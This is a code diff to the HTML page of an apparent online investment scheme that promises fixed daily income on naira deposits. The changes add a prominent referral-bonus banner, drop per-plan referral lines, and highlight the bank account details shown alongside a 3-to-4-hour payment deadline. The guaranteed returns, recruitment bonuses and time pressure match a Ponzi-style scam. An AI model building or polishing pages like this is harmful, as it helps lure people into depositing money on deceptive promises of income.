@@ -292,6 +292,11 @@
             box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
             text-align: center;
         }
+       .update{
+           Font-size: 30px;
+           Font-weight: bold;
+           Color: #31ff15;
+       }
 
     </style>
 </head>
@@ -307,6 +312,8 @@
         <p>Deposit Now and clear your Welcome bonus ₦500 </p>
         <p>You can withdraw your Welcome bonus Now</p>
         <p>Welcome <span id="userfullName"></span>👋</p>
+        <p class="update"> New Update Referral Bonus ₦1,000</p>
+        In your balance account
     </header>
 
     <main class="products-container">
@@ -319,7 +326,7 @@
             <p>Daily Income: ₦160</p>
             <p>Duration: 35 days</p>
             <p>Total Income: ₦5,600</p>
-            <p>Referrals Bonus ₦280</p>
+           
             <button class="invest-btn">Deposit</button>
         </div>
 
@@ -331,7 +338,7 @@
             <p>Daily Income: ₦350</p>
             <p>Duration: 35 days</p>
             <p>Total Income: ₦13,650</p>
-            <p>Referral bonus ₦600 </p>
+          
             <button class="invest-btn">Deposit</button>
         </div>
 
@@ -343,7 +350,7 @@
             <p>Daily Income: ₦750</p>
             <p>Duration: 36 days</p>
             <p>Total Income: ₦28,080</p>
-            <p>Referral bonus ₦950 </p>
+           
                         <button class="invest-btn">Deposit</button>
         </div>
 
@@ -355,7 +362,7 @@
             <p>Daily Income: ₦1,560</p>
             <p>Duration: 37 days</p>
             <p>Total Income: ₦57,720</p>
-           <p>Referral bonus ₦2,100</p>
+          
             <button class="invest-btn">Deposit</button>
         </div>
 
@@ -367,7 +374,7 @@
             <p>Daily Income: ₦3,160</p>
             <p>Duration: 39 days</p>
             <p>Total Income: ₦121,680</p>
-            <p>Referral bonus ₦3160</p>
+           
             <button class="invest-btn">Deposit</button>
         </div>
 
@@ -379,7 +386,7 @@
             <p>Daily Income: ₦6,240</p>
             <p>Duration: 40 days</p>
             <p>Total Income: ₦249,600</p>
-            <p>Referral bonus ₦9200</p>
+           
             <button class="invest-btn">Deposit</button>
         </div>
 
@@ -391,7 +398,7 @@
             <p>Daily Income: ₦12,300</p>
             <p>Duration: 42 days</p>
             <p>Total Income: ₦524,160</p>
-            <p>Referral bonus ₦15,300</p>
+           
             <button class="invest-btn">Deposit</button>
         </div>
     </main>
@@ -423,7 +430,7 @@
             right: 2px;
             width: 70px;
             height: 70px;
-            Top: 220px;
+            Top: 100px;
             
             border-radius: 50%;
             box-shadow: 0 4px 8px rgba(0, 0, 0, 0.9);
@@ -460,12 +467,17 @@
     });
 </script>
 
-<style>        
+<style>   
+   .highlight-green{
+       Color: blue;
+       Font-size: 20px;
+       Font-weight: bold;
+   }
                 #whatsapp-icon {
             position: fixed;
             bottom: 20px;
             right: 0px;
-            Top: 300px;
+            Top: 150px;
             width: 60px;
             height: 60px;
             animation: motion 3s infinite;
@@ -633,9 +645,9 @@
                         // Display bank information container
                         bankInfoContainer.style.display = 'flex';
                         bankInfoContainer.innerHTML = `
-                            <p>Account Number: <span id="accountNumber">${bankInfo.accountNumber}</span></p>
-                            <p>Bank Name: ${bankInfo.bankName}</p>
-                            <p>Account Name: ${bankInfo.accountName}</p>
+                            <p class="highlight-green">Account Number: <span id="accountNumber">${bankInfo.accountNumber}</span></p>
+                            <p class="highlight-green">Bank Name: ${bankInfo.bankName}</p>
+                            <p class="highlight-green">Account Name: ${bankInfo.accountName}</p>
                             <p class="highlight-red">Please make payment within 3 to 4 hours. After that, the request will be cancelled.</p>
                         `;
 
